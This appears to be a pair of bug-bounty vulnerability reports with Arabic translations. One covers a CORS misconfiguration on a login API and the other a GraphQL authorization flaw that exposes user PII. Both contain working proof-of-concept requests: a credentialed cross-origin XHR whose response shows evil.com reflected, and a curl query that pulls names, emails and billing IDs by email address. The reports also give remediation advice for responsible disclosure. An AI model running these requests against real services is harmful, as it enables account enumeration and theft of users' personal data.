title: Low-Severity CORS Misconfiguration on portal.target.cloud
summary: The API endpoint /api/users/login is vulnerable to a CORS Misconfiguration. The server reflects the Origin header and sets Access-Control-Allow-Credentials to true. This allows a malicious origin to bypass the Same-Origin Policy (SOP), enabling it to perform authenticated requests and exfiltrate sensitive JSON responses.
stepsToReproduce: 1 - I have verified that an attacker can read the API response from an external domain.

request.code:
<!DOCTYPE html>
<html>
<body>
    <script>
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://portal.target.cloud/api/users/login", true);
        xhr.withCredentials = true;
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.setRequestHeader("Authorization", "1");
        xhr.setRequestHeader("Forcev1apilowercamelcase", "true");
        xhr.setRequestHeader("X-Authentication-Type", "Password");

        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4) {
                // This confirms that the SOP is bypassed and data is readable
                alert("[VULNERABILITY CONFIRMED]\nData captured:\n" + xhr.responseText);
            }
        };

        xhr.send(JSON.stringify({
            "clientType": 6,
            "tenantType": 1,
            "emailAddress": "admin@gmail.com",
            "password": null
        }));
    </script>
</body>
</html>

response.code:
HTTP/2 200 OK
Date: Mon, 12 Feb 2024 14:56:12 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 123
Connection: keep-alive
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true

[USER DATA]

references: Review the CORS response headers and attach the request/response evidence here.
impact: 1 - Sensitive Data Exposure: An attacker can capture sensitive account details returned by the API. 2 - Account Enumeration: An external site can distinguish between valid and invalid users. 3 - User Profiling: An attacker can silently gather victim metadata (User-Agent, OS, etc.) alongside the leaked API data.
recommendation: 1 - Restrict Access-Control-Allow-Origin to a whitelist of trusted domains. 2 - Never reflect the Origin header if Access-Control-Allow-Credentials is set to true. 3 - Implement stricter CORS preflight checks.

ar.title: ضبط خاطئ لـ CORS منخفض الخطورة على portal.target.cloud
ar.summary: نقطة النهاية /api/users/login معرّضة لضبط خاطئ لـ CORS. يعكس الخادم ترويسة Origin ويضبط Access-Control-Allow-Credentials على true، مما يتيح لأصل خبيث تجاوز سياسة الأصل الواحد (SOP) وتنفيذ طلبات موثّقة وسحب استجابات JSON حساسة.

title: Unauthenticated PII Disclosure via user Query due to Broken Object Level Authorization (BOLA)
summary: The API architecture demonstrates an inconsistent authorization model. While sensitive Mutations are protected by reCAPTCHA and Authorization headers, the user(email: String!) Query lacks any resolver-level authorization. This allows an unauthenticated actor to perform targeted or mass user enumeration and retrieve internal PII.

request.code:
curl -X POST https://linkdm-backend.linkdm.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(email: \"uiux@gmail.com\") { id first_name last_name email customer_id price_id created_at } }"}'

references: Add supporting material and references for this finding.
impact: 1 - User Enumeration & PII Harvesting: Since email enumeration is allowed in-scope, an attacker can automate requests to build a database of registered users. Crucially, this also applies to administrative accounts (e.g., admin@linkdm.com), allowing attackers to identify internal staff and map the platform's administrative structure. 2 - Sensitive Identifier Leakage: Exposure of customer_id and price_id (Stripe-related identifiers) may assist attackers in mapping billing-related integrations or social engineering. 3 - Information Leakage via Suggestions: The ability to map internal input objects (e.g., UpdateUserInput) significantly reduces the effort required for an attacker to conduct more complex injection or mass-assignment attacks.
recommendation: 1 - Authorization: Implement a mandatory session validation check within the user query resolver. 2 - Hardening: Disable GraphQL "Field Suggestions" in production to prevent schema discovery. 3 - Rate Limiting: Apply strict per-IP rate limits on the /graphql endpoint to mitigate automated enumeration. 4 - Statement of Responsibility: Research was conducted using only accounts I created for this purpose. I am available for further technical discussion or fix verification.

ar.title: كشف بيانات شخصية دون مصادقة عبر استعلام user بسبب ثغرة BOLA
ar.summary: تُظهر بنية الـ API نموذج صلاحيات غير متسق. فبينما تُحمى العمليات الحساسة بـ reCAPTCHA وترويسات التفويض، لا يتضمن استعلام user(email: String!) أي تحقق على مستوى الـ resolver، مما يتيح لمهاجم غير موثّق تعداد المستخدمين وسحب بيانات شخصية داخلية.
